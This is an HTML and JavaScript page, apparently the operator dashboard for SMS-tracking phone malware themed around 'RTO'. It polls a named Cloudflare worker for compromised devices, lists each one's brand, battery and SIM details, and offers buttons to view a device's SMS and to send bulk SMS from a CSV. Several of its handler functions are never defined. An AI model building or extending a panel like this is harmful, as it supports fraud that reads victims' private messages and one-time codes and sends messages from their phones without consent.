<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Live Admin Control</title>
    <style>
        :root { --red: #ff4444; --yellow: #ffbb33; --green: #00C851; --blue: #33b5e5; --pink: #ff4081; }
        body { font-family: sans-serif; background: #121212; color: white; margin: 0; padding: 10px; }
        .grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
        .card { background: #1e1e1e; border: 2px solid var(--blue); border-radius: 10px; padding: 15px; }
        .btn-group { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
        button { flex: 1; padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; }
        
        /* Modal Style */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
        .modal-box { background: #252525; padding: 20px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; border: 1px solid var(--pink); }
    </style>
</head>
<body>
    <h2 style="text-align:center">RTO LIVE DASHBOARD</h2>
    <div id="grid" class="grid">Loading Devices...</div>

    <div id="popup" class="modal">
        <div class="modal-box">
            <h3 id="pTitle" style="color:var(--yellow)"></h3>
            <div id="pContent" style="margin: 15px 0;"></div>
            <button onclick="closeP()" style="background:var(--red); width: 100%;">OK CLOSE</button>
        </div>
    </div>

    <script>
        const WORKER_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev";

        async function fetchDevices() {
            try {
                const res = await fetch(`${WORKER_URL}/api/devices`);
                const data = await res.json();
                document.getElementById('grid').innerHTML = data.map(d => `
                    <div class="card" onclick="showOptions('${d.id}', '${d.brand}')">
                        <div style="float:right; color:var(--green)">${d.battery}%</div>
                        <strong>${d.brand}</strong><br>
                        <small style="color:var(--blue)">${d.sim_info}</small>
                    </div>
                `).join('');
            } catch (e) { document.getElementById('grid').innerText = "Error fetching data..."; }
        }

        function showOptions(id, brand) {
            const html = `
                <div class="btn-group">
                    <button style="background:var(--green)" onclick="uploadCSV('${id}')">SEND SMS (CSV)</button>
                    <button style="background:var(--yellow)" onclick="viewSMS('${id}')">VIEW SMS</button>
                    <button style="background:var(--blue)" onclick="showDetails('${id}')">DETAILS</button>
                </div>
            `;
            openP(brand, html);
        }

        function openP(title, body) {
            document.getElementById('pTitle').innerText = title;
            document.getElementById('pContent').innerHTML = body;
            document.getElementById('popup').style.display = 'flex';
        }

        function closeP() { document.getElementById('popup').style.display = 'none'; }

        // Initial Load
        setInterval(fetchDevices, 5000);
        fetchDevices();
    </script>
</body>
</html>
